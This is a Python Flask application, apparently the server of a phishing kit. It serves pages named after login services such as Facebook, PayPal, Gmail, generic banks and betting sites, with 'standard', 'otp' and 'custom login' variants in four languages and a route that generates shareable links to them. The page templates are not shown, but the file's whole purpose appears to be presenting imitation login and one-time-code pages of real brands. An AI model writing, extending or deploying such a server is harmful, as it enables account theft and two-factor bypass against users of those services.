import os
from flask import Flask, render_template, request, redirect, url_for, abort

app = Flask(__name__)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TEMPLATES_DIR = os.path.join(BASE_DIR, "templates")

SUPPORTED_PLATFORMS = [
    "1xbet",
    "amazon",
    "bank",
    "betclic",
    "facebook",
    "gmail",
    "instagram",
    "linkedin",
    "netflix",
    "paypal",
    "snapchat",
    "telegram",
    "tiktok",
    "whatsapp",
    "yahoo",
]

SUPPORTED_MODES = ["standard", "otp", "custom"]
SUPPORTED_LANGS = ["fr", "en", "es", "ar"]


def normalize_platform(raw_value: str | None) -> str:
    """Détecte la plateforme depuis un nom ou une URL sans forcer TikTok par défaut."""
    if not raw_value:
        return "facebook"

    cleaned = raw_value.strip().lower()

    for platform in SUPPORTED_PLATFORMS:
        if platform in cleaned:
            return platform

    for suffix in ("_otp.html", "_otp", ".html", ".htm"):
        if cleaned.endswith(suffix):
            cleaned = cleaned[: -len(suffix)]

    return cleaned if cleaned in SUPPORTED_PLATFORMS else "facebook"


def normalize_mode(raw_mode: str | None) -> str:
    """Normalise le mode de page demandé."""
    if not raw_mode:
        return "standard"

    mode = raw_mode.strip().lower()
    if mode in ("custom", "custom_login", "personnalise"):
        return "custom"
    if mode in ("otp", "code"):
        return "otp"
    return "standard"


def normalize_lang(raw_lang: str | None) -> str:
    """Normalise le code de langue (fr, en, es, ar)."""
    if not raw_lang:
        return "fr"

    lang = raw_lang.strip().lower()[:2]
    return lang if lang in SUPPORTED_LANGS else "fr"


def resolve_template_path(platform: str, mode: str) -> str:
    """Résout le chemin du template dans templates/ selon le mode et l'extension (.html / .htm)."""
    if mode == "custom":
        custom_path = os.path.join(TEMPLATES_DIR, "custom_login.html")
        if os.path.isfile(custom_path):
            return "custom_login.html"
        abort(404, description="Modèle custom_login.html introuvable")

    if mode == "otp":
        otp_rel = os.path.join("otp", f"{platform}_otp.html")
        if os.path.isfile(os.path.join(TEMPLATES_DIR, otp_rel)):
            return otp_rel
        abort(404, description=f"Modèle OTP introuvable pour {platform}")

    for ext in (".html", ".htm"):
        standard_rel = os.path.join("standard", f"{platform}{ext}")
        if os.path.isfile(os.path.join(TEMPLATES_DIR, standard_rel)):
            return standard_rel

    abort(404, description=f"Modèle standard introuvable pour {platform}")


@app.route("/")
def index():
    """Page principale avec sélection de plateforme, mode, langue et fenêtre modale."""
    return render_template(
        "index.html",
        platforms=SUPPORTED_PLATFORMS,
        modes=SUPPORTED_MODES,
        langs=SUPPORTED_LANGS,
    )


@app.route("/generate", methods=["GET"])
def generate_link():
    """Redirige vers /open avec des paramètres normalisés."""
    platform = normalize_platform(request.args.get("platform"))
    mode = normalize_mode(request.args.get("mode"))
    lang = normalize_lang(request.args.get("lang"))
    return redirect(url_for("open_page", platform=platform, mode=mode, lang=lang))


@app.route("/open", methods=["GET"])
def open_page():
    """Affiche le modèle correspondant à la plateforme, au mode et à la langue."""
    platform = normalize_platform(request.args.get("platform"))
    mode = normalize_mode(request.args.get("mode"))
    lang = normalize_lang(request.args.get("lang"))

    template_rel_path = resolve_template_path(platform, mode)

    return render_template(
        template_rel_path,
        platform=platform,
        mode=mode,
        lang=lang,
    )


@app.errorhandler(404)
def page_not_found(error):
    return render_template(
        "index.html",
        platforms=SUPPORTED_PLATFORMS,
        modes=SUPPORTED_MODES,
        langs=SUPPORTED_LANGS,
        error_message=error.description,
    ), 404


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
